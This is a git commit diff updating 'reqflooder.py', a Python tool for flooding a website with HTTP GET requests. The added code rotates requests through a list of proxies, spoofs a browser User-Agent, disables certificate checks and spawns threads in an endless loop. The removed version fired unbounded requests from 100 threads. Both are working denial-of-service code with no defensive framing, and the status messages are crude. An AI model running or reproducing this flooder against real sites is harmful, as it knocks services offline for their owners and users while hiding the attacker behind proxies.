9a7baad4cc13b72bfe221b21098096268faff91d
Anikin Luke Abales <47096239+abalesluke@users.noreply.github.com>
2021-05-21 21:47:27 +0800

    Update reqflooder.py

--- reqflooder.py
+++ reqflooder.py
@@ -1,40 +1,37 @@
-import requests, threading, readline, os
-from colorama import Fore, Style
+#!/usr/bin/python3
+import requests, threading, os, readline, optparse
+from colorama import Fore
 
-#url = 'http://justice.rf.gd/log/log.php'
-#url = input("Enter url: ")
-
-if(os.path.exists('last_url.txt')):
-	f = open('last_url.txt', 'r')
-	f = f.read().splitlines()
-	if f is None or f == '':
-		pass
-	else:
-		print('last url: '+str(f))
-	url = input("Enter url: ")
-	f = open('last_url.txt', 'w')
-	f.write(url)
-	f.close()
-
+read = optparse.OptionParser()
+read.add_option('-u', '--url',help="Enter Website url", dest='url')
+(value, key) = read.parse_args()
+url = value.url
+if url is None:
+	print("before executing this code you can also use -u flag\neg.[python3 reqflood.py -u <url>]\n")
+	url = input('Enter url: ')
 else:
-	url = input("Enter url: ")
-	f = open('last_url.txt', 'w')
-	f.write(url)
-	f.close()
+	pass
+
+proxy = open('http_proxies.txt', 'r')
+proxieslist = proxy.readlines()
+
+count = 0
+
+def flood():
+	try:
+		header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
+		for x in proxieslist:
+			proxiez = {'http':'http:'+str(x),'https':'http:'+str(x)}
+			r = requests.get(url, proxies=proxiez, headers=header, verify=False)
+			global count
+			count+=1
+			print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}fucking this shit: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
+	except:
+		pass
 
 
-
-headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
-x = 0
-
-def hell():
-	while True:
-    global x
-		x+=1
-		requests.get(url, headers=headers)
-		print(f'{Style.BRIGHT}{Fore.MAGENTA}[{Fore.RED}*{Fore.MAGENTA}]{Fore.CYAN} sending SHITS {Fore.YELLOW}[{Fore.GREEN}{x}{Fore.YELLOW}]{Fore.MAGENTA} {url}')
-
-power = 100
-
-for i in range(power):
-	threading.Thread(target=hell).start()
+while True:
+	try:
+		threading.Thread(target=flood).start()
+	except:
+		print('while loop err.')
